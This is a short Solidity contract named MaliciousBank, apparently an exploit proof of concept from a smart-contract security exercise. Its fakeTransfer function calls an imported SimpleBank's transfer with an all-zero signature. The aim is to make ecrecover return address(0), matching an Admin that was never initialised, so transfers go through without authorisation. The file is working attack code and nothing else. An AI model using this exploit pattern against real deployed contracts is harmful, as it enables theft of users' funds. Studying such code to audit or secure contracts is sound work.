// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./ecrecover.sol";

contract MaliciousBank {
    SimpleBank public simpleBank;
    address public attacker;

    constructor(SimpleBank _simpleBank) {
        simpleBank = _simpleBank;
        attacker = msg.sender;
    }

    function fakeTransfer(
        address _to,
        uint256 _amount
    ) public {
        // Craft a signature for address(0) exploiting the uninitialized Admin
        bytes32 emptyHash = keccak256(abi.encodePacked(address(0), _amount));
        simpleBank.transfer(_to, _amount, emptyHash, 0, 0, 0);
    }
}